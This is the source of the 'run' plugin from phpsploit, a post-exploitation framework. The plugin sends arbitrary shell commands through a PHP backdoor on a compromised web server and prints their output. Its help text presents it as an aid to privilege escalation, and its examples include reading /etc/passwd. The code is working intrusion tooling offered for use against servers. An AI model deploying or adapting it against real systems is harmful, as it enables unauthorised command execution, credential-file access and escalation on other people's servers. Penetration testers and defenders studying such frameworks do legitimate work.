"""Execute a command on the server

SYNOPSIS:
    run "<SHELL COMMAND>"

DESCRIPTION:
    Most of the phpsploit plugins intend to simulate shell
    commands over obfuscated PHP implementations.
    Therefore, in a few remote servers, real command execution
    is not blocked, so using them would be a plus in the
    privilege escalation process.

    NOTE: This plugins works on any standard platform, but the
    following features are only available on unix systems:

    - To any sent command, a `cd` command to move to the
    phpsploit's PWD environment variable will be prepended. It
    ensures the commands are launched from the same directory
    than in the phpsploit paradygm.
    - To any sent command, a `pwd` command is appendend as last
    command to collect the current working directory before
    commands execution, in cases the requested commands ordered
    to change the directory. It allows the plugin to upgrade
    PWD environment variable if necessary.

WARNING:
    Considering phpsploit's input parser, commands which
    contain quotes, semicolons, and other chars that could be
    interpreted by the framework MUST be enquoted to be
    interpreted as a single argument. For example:
      > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
    In this case, quotes and semicolons will be interpreted by
    the framwework, so the correct syntax is:
      > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

EXAMPLES:
    > run ipconfig /all
      - Run the 'ipconfig' tool on windows servers
    > run ls -la /etc
      - List any file in the /etc/ directory on *nix systems
    > run "cat /etc/passwd | grep root; ls /tmp"
      - Just a multi command, which must be enquoted because
        of the semicolon (see WARNING)

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

if self.argc < 2:
    api.exit(self.help)

cmdSep = ";"
if api.server['platform'] == 'win':
    cmdSep = "&"

cmdSep = " %s " % cmdSep

commands = list()

# patch to view stderr in linux
if api.server['platform'] == 'nix':
    commands+= ['exec 2>&1']

# go to pwd
commands+= ['cd '+rpath.cwd]

# here i use self.args that is all the raw line arguments string
# because ' '.join(self.argv) is an altered string that was parsed by phpsploit
commands+= [self.args]


CMD = cmdSep.join(commands)

# patch to take care of new CWD if changed (part1)
if api.server['platform'] == 'nix':
    CMD+= cmdSep+'pwd'

http.send({'CMD' : CMD})

response = http.response.splitlines()


# patch to take care of new CWD if changed (part2)
if api.server['platform'] == 'nix':
    if len(response):
        if response[-1].startswith('/'):
            api.env['CWD'] = response[-1].strip()
            response = response[:-1]
    else:
        response = []

if response:
    print P_NL.join(response)
